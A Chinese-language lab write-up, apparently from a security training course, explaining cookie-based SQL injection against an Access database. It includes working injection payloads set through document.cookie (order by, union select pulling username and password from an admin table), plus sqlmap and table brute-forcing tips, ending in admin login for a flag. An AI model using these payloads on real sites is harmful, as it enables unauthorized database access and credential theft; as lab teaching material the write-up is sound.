# Chapter 5.1 Access - cookie注入

---

[TOC]

---

## 原理

### Cookie

> Cookie是一个保存在客户机中的简单的文本文件, 这个文件与特定的 Web 文档关联在一起, 保存了该客户机访问这个Web 文档时的信息, 当客户机再次访问这个 Web 文档时这些信息可供该文档使用。由于“Cookie”具有可以保存在客户机上的神奇特性, 因此它可以帮助我们实现记录用户个人信息的功能。

正由于Cookie具有如上所述的记录用户个人信息的功能，大部分网站几乎都会在用户访问时储存Cookie，并且在**用户请求同一网站时发送该Cookie给服务器**。

### [$_REQUEST]

作为超级全局变量，该传参方式不仅可以用来获取由浏览器通过GET\POST方法提交的数据，还能接受Cookie的传参，被广泛使用。

**cookie注入其原理也是将提交的注入参数以Cookie方式提交。**

## 思路

1. 判断注入点、注入方式
2. 修改Cookie中全局变量传参
   - **Application**：通过调试台-Application-cookies中的对应网站设置Cookie，添加参数和注入语句。
     - 优点：无需特定环境和工具，浏览器通用
     + 缺点：需要对每条注入语句进行URL转码
   - **Burp-Decoder**：通过burp抓包，传入decoder解码
     - 优点：方便软件内直接解码
     - 缺点：重复操作繁琐
   - **Chrome插件**：使用插件直接修改
     - 优点：方便网页上直接修改
     - 缺点：仍需手动转码
   - **※Console-JavaScript**：通过调试台-console执行修改cookie语句
     
     - 优点：通过document. Cookie和escape()函数可以便捷地设置cookie和直接转码
3. 查询字段总数
4. 猜询表名列名
   
   - 由于Access数据库没有库名只有表名，也没有information_schema库，所以只能使用暴破的方式猜测表名。
5. 脱库获取信息

## 过程

1. **使用运算符判断是否存在注入点**
```php
?id=171-1 -->返回正常结果
```
![](https://nc0.cdn.zkaq.cn/md/5371/d4fe887de5c756980cfe58add14bd79b_46697.png)

2. **尝试普通SQL注入，被WAF拦截，失败**
```mysql
?id=170 and 1=1
```

![](https://nc0.cdn.zkaq.cn/md/5371/b6f7073a5bea453419c896d8d4dcc93a_57723.png)

3. **尝试使用`document.cookie`传参，通过`order by`推测字段数和回显点**
```javascript
document.cookie="id="+escape("171 order by 10")
```
![](https://nc0.cdn.zkaq.cn/md/5371/0ce9225b0b8c4c8bf31275095f32f26a_31442.png)
4. **使用弱名称暴破猜测表名，判断回显点**
```javascript
document.cookie="id"+escape("171 union select 1,2,3,4,5,6,7,8,9,10 from admin")
```

![](https://nc0.cdn.zkaq.cn/md/5371/c23a1fa38eef85be96e95a83c4d98814_99112.png)

5. **猜询字段名**
```javascript
document.cookie="id"+escape("171 union select 1,username,password,4,5,6,7,8,9,10 from admin")
```

![](https://nc0.cdn.zkaq.cn/md/5371/ba323b579deff767117a4bf95f01f931_71022.png)

6. **通过测出的表名和字段名进行查询，返回一串MD5加密信息，进行解密**

![](https://nc0.cdn.zkaq.cn/md/5371/09d453cc38ed6edc958172bf55862064_76362.png)
7. **后台登陆，获取flag。**
![](https://nc0.cdn.zkaq.cn/md/5371/19cd06b7be097431923f961ba9f6d4a0_15414.png)



## 思考与要点

1. 在没有information_schema的情况下要猜测表名只能靠常用的表名字典(如admin，users等)，在手动尝试无效后可以尝试使用SQLmap工具，只需要抓包后在Cookie后添加`*`或者直接加入参数```-- cookie "[str]"```并提高risk等级。

2. Access不支持不带表名的 ```SELECT 1,2,3```，所以一定要跟表名，也可用于表名猜测。
3. 无法查询系统自带库的时候可以使用可以burp暴破，使用``` AND exist(select * from 表名)```。